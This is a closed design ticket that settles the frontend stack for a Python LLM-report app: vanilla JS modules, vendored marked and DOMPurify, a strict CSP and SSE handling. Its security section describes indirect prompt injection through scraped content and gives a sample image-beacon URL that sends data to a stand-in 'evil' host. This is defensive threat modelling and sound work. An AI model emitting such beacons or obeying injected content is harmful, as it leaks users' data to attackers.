---
id: 004
title: "Decide: frontend technology"
labels: [wayfinder:grilling]
status: closed
assignee: JMAN730
blocked-by: [002, 003]
---

## Question

Server-rendered (Jinja2 + htmx/vanilla JS) vs SPA (Vite + React) vs single static page consuming JSON API?

Tension: repo is pure Python with no Node toolchain; a build step complicates packaging (UI must ship as package data). But the live-progress screen is state-heavy. (Leaning: no Node build — static page(s) + vanilla JS/htmx over the 002 transport; revisit if the 003 prototype demands more.)

## Resolution

Decided via 2-skeptic adversarial workflow (`wf_26825918-4b3`); both clusters "amended" — skeleton confirmed, hardening promoted from optional to mandatory.

**Architecture: vanilla JS ES modules, zero build step, no framework.**
- Structure: `static/index.html` + `static/js/{store,sse,api}.js` + `static/js/views/*.js` served by FastAPI StaticFiles; hand-rolled pub/sub store; native `EventSource`. Live-screen state is enumerable (7 report-section buffers, ~14 agent-node states, one run, tool-call list) — a framework buys nothing. Rejections hold: React/Vite (Node chain in a zero-package.json repo), htmx+Jinja2 (streaming appends and node-state flips are client-state mutations, not fragment swaps), micro-framework (bounded state).
- "Zero third-party JS" was false: web must render streaming LLM **markdown** (CLI renders every report section via rich Markdown, cli/main.py:437,786-826; prototype hard-coded its prose). Amended to: no framework, **two vendored leaf libraries only** (marked + DOMPurify, below).
- Mandatory hardening from skeptic evidence:
  - `mimetypes.add_type('text/javascript', '.js')` (and `.mjs`) at server startup — Python's mimetypes reads the Windows registry, and polluted `HKCR\.js → text/plain` machines hard-block ES modules (spec-strict MIME check) → blank app.
  - `Cache-Control: no-cache` on the static mount — Starlette FileResponse sets etag/last-modified but no cache-control; heuristic caching serves stale JS after pip upgrades. ETag 304s are free on localhost.
  - Hash-based routing (`#/configure`, `#/run`, `#/reports`) — StaticFiles 404s unknown paths, no SPA fallback, and a catch-all would collide with the API.
  - SSE replay contract: server keeps a per-run in-memory event log with monotonic ids (bounded — max 1 active run per ticket 002), replays from `Last-Event-ID`; client reducers idempotent; `sse.js` MUST close the EventSource on a terminal `done` event (else infinite auto-reconnect). Session token, if used, rides cookie/query — EventSource cannot send custom headers.

**Markdown rendering & XSS (security-critical, recorded verbatim):**
- Client-side pipeline: `DOMPurify.sanitize(marked.parse(md))` before insertion. Vendored single-file UMD builds in `static/vendor/` with license files. Deciding rationale for marked: analyst prompts mandate GFM tables (fundamentals_analyst.py:27, market_analyst.py:54, news_analyst.py:29, schemas.py:320); snarkdown has no tables and is unmaintained; micromark has no single-file browser build.
- Ship a strict CSP as an HTTP response header (not only a meta tag): `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'`. Consequence: production UI uses external JS/CSS files only — the prototype's inline-style/script structure cannot carry over.
- `img-src 'self' data:` is the critical directive: report markdown derives from attacker-influenceable scraped content (Reddit, StockTwits, news), so indirect prompt injection can plant `![](https://evil/?leak=...)` image beacons for data exfiltration. DOMPurify does not block remote image URLs; only CSP does. Reports have no legitimate remote images.
- Pin DOMPurify at an exact 3.2.x version, recorded in the vendor dir, default config, with a documented bump-on-advisory step (bypass history: CVE-2024-45801, CVE-2024-47875). Add the `afterSanitizeAttributes` hook forcing `rel="noopener noreferrer"` on links; optionally `FORBID_ATTR: ['style']`.
- Streaming: report sections arrive as whole per-node strings (~14 events/run) — full re-parse per event is trivially cheap. If token-level `messages` mode is added later, keep whole-accumulated re-parse but coalesce DOM writes via requestAnimationFrame; no incremental parser needed. marked emits no inline styles (table alignment is an `align` attribute), so strict `style-src` costs nothing; style output via a `.report-body` class.
